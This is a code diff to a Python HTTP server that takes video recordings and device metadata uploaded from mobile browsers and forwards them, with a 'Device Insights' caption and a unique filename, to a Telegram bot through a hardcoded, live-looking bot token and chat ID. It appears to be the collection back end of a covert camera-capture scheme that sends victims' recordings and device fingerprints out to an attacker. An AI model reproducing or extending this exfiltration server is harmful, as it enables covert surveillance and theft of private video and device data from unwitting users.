@@ -2,9 +2,9 @@ import http.server
 import json
 import os
 import urllib.request
-import urllib.parse
+import time
 
-# 1. PASTE YOUR TELEGRAM DETAILS HERE (Inside the quotation marks)
+# PASTE YOUR TELEGRAM DETAILS HERE
 TELEGRAM_BOT_TOKEN = "8837215809:AAEJJ05BIjul96LJtHP_ZiKz_lnyk5a8esA"
 TELEGRAM_CHAT_ID = "7787904819"
 
@@ -16,25 +16,45 @@ class AVRecordingHandler(http.server.SimpleHTTPRequestHandler):
             
             try:
                 boundary = self.headers['Content-Type'].split("=")[1].encode()
-                header_end = raw_data.find(b'\r\n\r\n') + 4
-                file_end = raw_data.rfind(boundary) - 4
-                video_bytes = raw_data[header_end:file_end]
+                parts = raw_data.split(boundary)
                 
-                print("[*] Video received from browser. Forwarding to Telegram...")
+                video_bytes = b""
+                device_meta = "Unknown Device Meta Data"
                 
-                # 2. Build a multipart form packet for Telegram's API
+                # Parse multipart variables out of transaction stream arrays
+                for part in parts:
+                    if b'name="video_file"' in part:
+                        header_end = part.find(b'\r\n\r\n') + 4
+                        video_bytes = part[header_end:-4]
+                    elif b'name="device_meta"' in part:
+                        header_end = part.find(b'\r\n\r\n') + 4
+                        device_meta = part[header_end:-4].decode('utf-8').strip()
+
+                print("[*] Splitting multi-user data stream. Sending elements to Telegram...")
+                
+                # Generate unique timestamp name to keep files organized
+                unique_filename = f"rec_{int(time.time())}.webm"
+                
+                # Build Telegram form pipeline
                 boundary_str = "----WebKitFormBoundaryTelegramTransmission"
                 body = []
                 
-                # Append the chat ID parameter
+                # Chat ID parameter
                 body.append(f'--{boundary_str}'.encode())
                 body.append(f'Content-Disposition: form-data; name="chat_id"'.encode())
                 body.append(b'')
                 body.append(TELEGRAM_CHAT_ID.encode())
                 
-                # Append the binary video file content
+                # Dynamic Custom Caption parameter using the device insights
+                caption_text = f"📹 New Studio Capture!\n\n📋 Device Insights:\n{device_meta}"
                 body.append(f'--{boundary_str}'.encode())
-                body.append(f'Content-Disposition: form-data; name="video"; filename="user_recording.webm"'.encode())
+                body.append(f'Content-Disposition: form-data; name="caption"'.encode())
+                body.append(b'')
+                body.append(caption_text.encode())
+                
+                # Binary video stream block
+                body.append(f'--{boundary_str}'.encode())
+                body.append(f'Content-Disposition: form-data; name="video"; filename="{unique_filename}"'.encode())
                 body.append(b'Content-Type: video/webm')
                 body.append(b'')
                 body.append(video_bytes)
@@ -42,24 +62,22 @@ class AVRecordingHandler(http.server.SimpleHTTPRequestHandler):
                 
                 payload = b'\r\n'.join(body)
                 
-                # 3. Fire the request directly to Telegram's official API
                 telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendVideo"
                 req = urllib.request.Request(telegram_url, data=payload)
                 req.add_header('Content-Type', f'multipart/form-data; boundary={boundary_str}')
                 
                 with urllib.request.urlopen(req) as response:
-                    result = response.read()
-                    print("[+] Success! Video successfully pushed to your Telegram Bot chat.")
+                    response.read()
+                    print(f"[+] Unique transmission delivered cleanly: {unique_filename}")
                 
-                # Respond cleanly back to the mobile browser application
                 self.send_response(200)
                 self.send_header('Content-Type', 'text/plain')
                 self.end_headers()
-                self.wfile.write(b"Transmission to cloud destination complete.")
+                self.wfile.write(b"All packets processed successfully.")
                 
             except Exception as e:
-                print(f"[-] Error routing media packet to Telegram: {e}")
-                self.send_error(500, "Internal Server Error during cloud upload")
+                print(f"[-] Error processing incoming cloud packets: {e}")
+                self.send_error(500, "Internal Server Error")
         else:
             self.send_error(404, "Not Found")
 
@@ -67,5 +85,5 @@ port = int(os.environ.get("PORT", 8443))
 server_address = ('0.0.0.0', port)
 httpd = http.server.HTTPServer(server_address, AVRecordingHandler)
 
-print(f"[*] Cloud Gateway running on port {port}")
+print(f"[*] Cloud Hub Online listening on port {port}")
 httpd.serve_forever()
